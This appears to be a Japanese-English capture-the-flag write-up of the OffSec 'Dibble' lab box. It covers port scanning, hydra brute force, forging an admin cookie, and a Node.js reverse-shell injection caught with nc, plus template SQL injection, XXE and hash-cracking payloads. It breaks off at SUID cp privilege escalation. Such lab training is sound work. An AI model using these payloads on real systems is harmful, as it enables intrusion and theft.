# Dibble

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.205.110  |
| Local IP          | 192.168.49.205   |
| Local listen port | 4444 |

## Port scan

### RustScan

- [x] Full TCP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
└─$ rustscan -a 192.168.205.110 --ulimit 5000 -- -sV -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/funa/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.205.110:21
Open 192.168.205.110:22
Open 192.168.205.110:80
Open 192.168.205.110:3000
Open 192.168.205.110:27017
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:37 JST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:37
Completed NSE at 11:37, 0.00s elapsed
Initiating Ping Scan at 11:37
Scanning 192.168.205.110 [2 ports]
Completed Ping Scan at 11:37, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:37
Completed Parallel DNS resolution of 1 host. at 11:37, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:37
Scanning 192.168.205.110 [5 ports]
Discovered open port 80/tcp on 192.168.205.110
Discovered open port 21/tcp on 192.168.205.110
Discovered open port 22/tcp on 192.168.205.110
Discovered open port 27017/tcp on 192.168.205.110
Discovered open port 3000/tcp on 192.168.205.110
Completed Connect Scan at 11:37, 0.25s elapsed (5 total ports)
Initiating Service scan at 11:37
Scanning 5 services on 192.168.205.110
Completed Service scan at 11:37, 11.81s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.205.110.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
NSE: [ftp-bounce 192.168.205.110:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.85% done; ETC: 11:38 (0:00:00 remaining)
Completed NSE at 11:38, 31.37s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 1.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Nmap scan report for 192.168.205.110
Host is up, received syn-ack (0.25s latency).
Scanned at 2022-06-04 11:37:46 JST for 46s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.49.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 9d:3f:eb:1b:aa:9c:1e:b1:30:9b:23:53:4b:cf:59:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJQfskNhOndcMLdRllpGbvhSaJBkmwdZnt3n0U7U3XxjpKx/ZUagAkwNTNPooV1Vc10PSdPE1pWMpqEiiHz7+guLRB4SrXsayYx67pZ0yiRrZ7gaxyEMKoI+p9owIt77Q6mG7PDjb5PQCd7G0xYFMCCaNFUpDfzZZUp2RGenL6b/xLSY1g0/Id1c9Q1S2pKsxMmf+TFqvAS6uOjSHY9fMbQesNQ0hZ74hcWooMOARyPTIYsu2/EmFjhz/hWydF2y5yikz96aBmBl6Z4KBVjp9vFHH50BwAMJuXyKMx5yCr4JzEV8RY3D6otNvR/yxuAxGcwffsaY6O1f9K8HyP6mF9J22tuxsRepSQTDUXNAUGeg9RR86RP7EpGkJ+3Y08vFGnsaRUY7w0800mpafyBeQMjO07urK0UuHihOKTRyW0aXsk9W/ruNJkLQNPWuNiZ/R1QCFRICQLJXl6V0nw0sKv7uxdDYO50OyQ3w3T08pazQr8tiuW38YonUwKPU6I6xc=
|   256 cd:dc:05:e6:e3:bb:12:33:f7:09:74:50:12:8a:85:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK9spPy8kad9kuulG4kX03Wofq8wXe6arLeCb41/Nh7xFMtpRGM6zo7A8U3Vatg7bX20jaU43i7uYZyl7IA5dNA=
|   256 a0:90:1f:50:78:b3:9e:41:2a:7f:5c:6f:4d:0e:a1:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ00KH0CvMHGQmVCsdM6I+93pxC0naR6to6qUq3ZJa4b
80/tcp    open  http    syn-ack Apache httpd 2.4.46 ((Fedora))
|_http-server-header: Apache/2.4.46 (Fedora)
|_http-generator: Drupal 9 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries
| /core/ /profiles/ /README.txt /web.config /admin/
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
| /user/password/ /user/login/ /user/logout/ /index.php/admin/
| /index.php/comment/reply/ /index.php/filter/tips /index.php/node/add/
| /index.php/search/ /index.php/user/password/ /index.php/user/register/
|_/index.php/user/login/ /index.php/user/logout/
| http-methods:
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-title: Home | Hacking Articles
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
3000/tcp  open  http    syn-ack Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
27017/tcp open  mongodb syn-ack MongoDB 4.2.9
| mongodb-databases:
|   ok = 1.0
|   databases
|     1
|       name = admin
|       sizeOnDisk = 40960.0
|       empty = false
|     0
|       name = account-app
|       sizeOnDisk = 131072.0
|       empty = false
|     3
|       name = local
|       sizeOnDisk = 73728.0
|       empty = false
|     2
|       name = config
|       sizeOnDisk = 61440.0
|       empty = false
|_  totalSize = 307200.0
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.83 seconds

```

### Nmap

- [x] Well-known UDP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
└─$ sudo nmap -Pn -sU --min-rate=10000 192.168.205.110
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:38 JST
Nmap scan report for 192.168.205.110
Host is up.
All 1000 scanned ports on 192.168.205.110 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds

```

## TCP

### FTP - 21

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
| vsftpd        | 3.0.3   |               |

- [ ] Anonymous login

  - [x] `anonymous:`

  ```bash
  ┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
  └─$ ftp anonymous@192.168.205.110 21
  Connected to 192.168.205.110.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp>
  
  ```

  `wget` を使ってすべてのファイルをダウンロードしようとしたが，エラーで接続が終了してしまう．

  ```bash
  ┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
  └─$ wget -r --no-passive ftp://anonymous:@192.168.205.110:21/
  --2022-06-04 12:08:50--  ftp://anonymous:*password*@192.168.205.110/
             => `192.168.205.110/.listing'
  192.168.205.110:21 に接続しています... 接続しました。
  anonymous としてログインしています... ログインしました!
  ==> SYST ... 完了しました。    ==> PWD ... 完了しました。
  ==> TYPE I ... 完了しました。  ==> CWD は必要ありません。
  ==> PORT ... 完了しました。    ==> LIST ...
  サーバの応答にエラーがあるので、接続を終了します。
  再試行しています。
  
  ```

  - [ ] `anonymous:anonymous`

  ```bash
  ftp anonymous@192.168.205.110 21
  ```

- [ ] Brute-force attack

  - [x] default credentials

  どうやら `ftp`, `anonymous` のログインはパスワードに関わらず許可されている．

  ```bash
  ┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
  └─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.205.110 -V -f -t 60
  <snip>
  [21][ftp] host: 192.168.205.110   login: ftp   password: b1uRR3
  [21][ftp] host: 192.168.205.110   login: ftp   password: ftp
  [21][ftp] host: 192.168.205.110   login: anonymous   password: anonymous
  1 of 1 target successfully completed, 3 valid passwords found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-04 12:48:50
  
  ```

  - [ ] passwords list

    - [x] benjamin

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.205.110 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [x] `benjamin:benjamin`

  ```bash
  ftp joe@192.168.205.110 21
  ```

### SSH - 22

| software name | version            | vulnerability |
| ------------- | ------------------ | ------------- |
| OpenSSH       | 8.3 (protocol 2.0) |               |

- [ ] Brute-force attack

  - [x] default credentials

  no hit.

  ```bash
  ┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
  └─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.205.110:22 -V -f -t 60
  <snip>
  [REDO-ATTEMPT] target 192.168.205.110 - login "zyfwp" - pass "superuser" - 156 of 164 [child 15] (32/32)
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-04 12:50:31
  
  ```

  - [ ] passwords list

    - [x] benjamin

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.205.110:22 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [x] `benjamin:benjamin`
  - [ ] 
  
  ```bash
  ssh joe@192.168.205.110 -p 22
  ```
  

### HTTP - 80

- [ ] Check software version

| software name | version           | vulnerability |
| ------------- | ----------------- | ------------- |
| Apache httpd  | 2.4.46 ((Fedora)) |               |
| Drupal        | 9                 |               |
| PHP           | 7.4.10            |               |

#### Enumeration

- [ ] Directory buster
  - [ ] /


```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
└─$ gobuster dir -f -u http://192.168.205.110:80/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.110:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2022/06/04 12:52:10 Starting gobuster in directory enumeration mode
===============================================================
/.hta/                (Status: 403) [Size: 199]
/.htaccess/           (Status: 403) [Size: 199]
/.htpasswd/           (Status: 403) [Size: 199]
/admin/               (Status: 403) [Size: 4306]
/Admin/               (Status: 403) [Size: 4306]
/ADMIN/               (Status: 403) [Size: 4306]
/batch/               (Status: 403) [Size: 4306]
/cgi-bin/             (Status: 403) [Size: 199]
/cgi-bin//            (Status: 403) [Size: 199]
/contact/             (Status: 200) [Size: 8188]
/Contact/             (Status: 200) [Size: 8188]
/core/                (Status: 200) [Size: 7965]
/icons/               (Status: 200) [Size: 74199]
/index.php/           (Status: 200) [Size: 13708]
/modules/             (Status: 200) [Size: 677]
/node/                (Status: 200) [Size: 13655]
/profiles/            (Status: 200) [Size: 679]
/Search/              (Status: 302) [Size: 382] [--> http://192.168.205.110/search/node]
/search/              (Status: 302) [Size: 382] [--> http://192.168.205.110/search/node]
/sites/               (Status: 200) [Size: 1560]
/themes/              (Status: 200) [Size: 1118]
/user/                (Status: 302) [Size: 378] [--> http://192.168.205.110/user/login]
/vendor/              (Status: 403) [Size: 199]

===============================================================
2022/06/04 12:55:05 Finished
===============================================================

```

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
└─$ gobuster dir -f -u http://192.168.205.110:80/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.110:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2022/06/04 12:57:23 Starting gobuster in directory enumeration mode
===============================================================
/contact/             (Status: 200) [Size: 8188]
/cgi-bin/             (Status: 403) [Size: 199]
/search/              (Status: 302) [Size: 382] [--> http://192.168.205.110/search/node]
/icons/               (Status: 200) [Size: 74199]
/user/                (Status: 302) [Size: 378] [--> http://192.168.205.110/user/login]
/themes/              (Status: 200) [Size: 1118]
/modules/             (Status: 200) [Size: 677]
/admin/               (Status: 403) [Size: 4306]
/node/                (Status: 200) [Size: 13655]
/sites/               (Status: 200) [Size: 1560]
/core/                (Status: 200) [Size: 7965]
/profiles/            (Status: 200) [Size: 679]
/vendor/              (Status: 403) [Size: 199]
/batch/               (Status: 403) [Size: 4306]

===============================================================
2022/06/04 13:43:20 Finished
===============================================================

```



| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read page source

#### Login brute force

- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f 192.168.205.110 http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f 192.168.205.110 http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### HTTP - 3000

| software name                | version | vulnerability                                                |
| ---------------------------- | ------- | ------------------------------------------------------------ |
| Node.js (Express middleware) |         |                                                              |
| Drupal                       | 9       | [CVE-2020-13671](https://nvd.nist.gov/vuln/detail/CVE-2020-13671) |
| Express                      |         |                                                              |
| Apache                       | 2.4.46  |                                                              |
| PHP                          | 7.4.10  |                                                              |

#### Enumeration

- [ ] Directory buster

  - [x] /

  イベントと問題の報告ページが表示される．

  ![image-20220604131201930](/home/funa/.config/Typora/typora-user-images/image-20220604131201930.png)

  - [x] /logs/

    - [x] /logs/all

     イベントログが表示される．ユーザ名が複数あるので保存しておく．

    ![image-20220604140959686](/home/funa/.config/Typora/typora-user-images/image-20220604140959686.png)

  - [x] /Logs/ --> /logs/

  - [x] /users/

    - [x] /users/administrator

    | administrator's profile |                               |
    | ----------------------- | ----------------------------- |
    | Name:                   | administrator                 |
    | GitHub:                 | http://github.com/            |
    | Twitter:                | https://twitter.com/sadserver |
    | Facebook:               | NEVER!                        |

    - [x] /users/Happy_message

    User not found

    - [x] /users/comprendre

    User not found

    - [x] /users/Mayroong

    User not found

  - [x] /auth/register

  新しいユーザを登録できるので，`l3ickey` というアカウントを作成する．

  ![image-20220604155724088](/home/funa/.config/Typora/typora-user-images/image-20220604155724088.png)

  - [x] /auth/login

  `/auth/register` で作成したユーザとパスワードでログインすると，`/logs` にイベントログを作成できるフォームにアクセスできる．

  ![image-20220604160024750](/home/funa/.config/Typora/typora-user-images/image-20220604160024750.png)

  試しにイベントログを作成してみると，`admin` しかイベントログを作成できない．

  ![image-20220604164510620](/home/funa/.config/Typora/typora-user-images/image-20220604164510620.png)

  `BurpSuite` でリクエストを確認すると，Cookie で `userLevel` という項目が設定されていることがわかる．

  ```http
  GET /users HTTP/1.1
  Host: 192.168.205.110:3000
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Referer: http://192.168.205.110:3000/auth/login
  Accept-Encoding: gzip, deflate
  Accept-Language: ja,en-US;q=0.9,en;q=0.8
  Cookie: connect.sid=s%3AF_BCAztsPjPUPnLPVGgBkkvYQOMLzFOW.%2FTTtniXXl5RuoUV7CX2EyaIJj3KCUwW7UqF9wQhQH2g; userLevel=ZGVmYXVsdA%3D%3D
  If-None-Match: W/"54d-+4oz4ExOfVcJZ5c73P6y33Jekdg"
  Connection: close
  
  username=l3ickey&msg=I%27m+hungry.
  ```

  `ZGVmYXVsdA%3D%3D` という文字列は `URL encode` されているように見えるのでデコードする．

  ```bash
  ZGVmYXVsdA==
  ```

  最後に `=` があることから，`base64` でエンコードされており，これもデコードする．

  ```bash
  default
  ```

  つまり Cookie には `userLevel=default` としてログインするように情報が設定されている．これを `userLevel=admin` としてログインする．`admin` を `base64` でエンコードする．

  ```bash
  YWRtaW4=
  ```

  `YWRtaW4=` を `=` だけ `URL encode` する．エンコードには [urlencoder.org](https://www.urlencoder.org/) を使った．

  ```bash
  YWRtaW4%3D
  ```

  全体は下記のようになる．

  ```bash
  POST /logs/new HTTP/1.1
  Host: 192.168.205.110:3000
  Content-Length: 34
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  Origin: http://192.168.205.110:3000
  Content-Type: application/x-www-form-urlencoded
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Referer: http://192.168.205.110:3000/logs
  Accept-Encoding: gzip, deflate
  Accept-Language: ja,en-US;q=0.9,en;q=0.8
  Cookie: connect.sid=s%3AF_BCAztsPjPUPnLPVGgBkkvYQOMLzFOW.%2FTTtniXXl5RuoUV7CX2EyaIJj3KCUwW7UqF9wQhQH2g; userLevel=YWRtaW4%3D
  Connection: close
  
  username=l3ickey&msg=I%27m+hungry.
  ```

  Cookie を書き換えることで `admin` としてイベントログを作成することができた．

  ![image-20220604170321752](/home/funa/.config/Typora/typora-user-images/image-20220604170321752.png)

  このアプリケーションは `Node.js` で動いているようなので，`1 + '1'` をメッセージに入れてコードが実行されるか試してみる．

  ![image-20220604171800227](/home/funa/.config/Typora/typora-user-images/image-20220604171800227.png)

  演算結果が返ってきたので，`Node.jp` のリバースシェルを実行する．ペイロードは [Reverse Shell Generator](https://www.revshells.com/) で作成した．

  ```javascript node.js
  (function(){
      var net = require("net"),
          cp = require("child_process"),
          sh = cp.spawn("sh", []);
      var client = new net.Socket();
      client.connect(80, "192.168.49.205", function(){
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
      });
      return /a/; // Prevents the Node.js application from crashing
  })();
  ```

  ```bash
  ┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
  └─$ nc -lnvp 80
  listening on [any] 80 ...
  connect to [192.168.49.205] from (UNKNOWN) [192.168.205.110] 48478
  id
  uid=1000(benjamin) gid=1000(benjamin) groups=1000(benjamin)
  which python
  /usr/bin/python
  python -c "import pty;pty.spawn('/bin/bash')"
  [benjamin@dibble app]$ pwd
  pwd
  /home/benjamin/app
  [benjamin@dibble app]$ cd ..
  cd ..
  [benjamin@dibble ~]$ ls
  ls
  app  local.txt
  [benjamin@dibble ~]$ cat local.txt
  cat local.txt
  e882fff1a8e3a51d3bae2ce3480e1cf5
  [benjamin@dibble ~]$
  
  ```

  `local.txt` を手に入れることができた．

  

  - [x] Not Found 404

  `/logs/administrator` のように存在しないページにアクセスすると，`404` ページが表示される．

  ![](/home/funa/.config/Typora/typora-user-images/image-20220604141717758.png)

  エラーの内容から，`benjamin` というユーザがいることがわかる．

  ```bash
  NotFoundError: Not Found
      at /home/benjamin/app/app.js:122:8
      at Layer.handle [as handle_request] (/home/benjamin/app/node_modules/express/lib/router/layer.js:95:5)
      at trim_prefix (/home/benjamin/app/node_modules/express/lib/router/index.js:317:13)
      at /home/benjamin/app/node_modules/express/lib/router/index.js:284:7
      at Function.process_params (/home/benjamin/app/node_modules/express/lib/router/index.js:335:12)
      at next (/home/benjamin/app/node_modules/express/lib/router/index.js:275:10)
      at /home/benjamin/app/node_modules/express/lib/router/index.js:635:15
      at next (/home/benjamin/app/node_modules/express/lib/router/index.js:260:14)
      at Function.handle (/home/benjamin/app/node_modules/express/lib/router/index.js:174:3)
      at router (/home/benjamin/app/node_modules/express/lib/router/index.js:47:12)
  ```


```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Dibble]
└─$ gobuster dir -f -u http://192.168.205.110:3000/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.110:3000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2022/06/04 13:11:13 Starting gobuster in directory enumeration mode
===============================================================
/logs/                (Status: 302) [Size: 33] [--> /auth/login]
/Logs/                (Status: 302) [Size: 33] [--> /auth/login]
/users/               (Status: 302) [Size: 33] [--> /auth/login]

===============================================================
2022/06/04 13:13:12 Finished
===============================================================

```



| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read page source

#### Login brute force

- [ ] Default credentials

  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)

  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f 192.168.205.110 http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f 192.168.205.110 http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### 

### MongoDB - 27017

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
| MongoDB       | 4.2.9   | none          |

[27017,27018 - Pentesting MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)

## Linux Privilege Escalation

- [x] List SUDO binaries

```bash
[benjamin@dibble ~]$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for benjamin:

Sorry, try again.

```

- [x] Find SUID binaries

```bash
[benjamin@dibble ~]$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/cp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chage
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check

```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

`/usr/bin/cp` を使って `/etc/passwd` に新しいユーザを作成する．

```bash
[benjamin@dibble ~]$ cat /etc/passwd > passwd
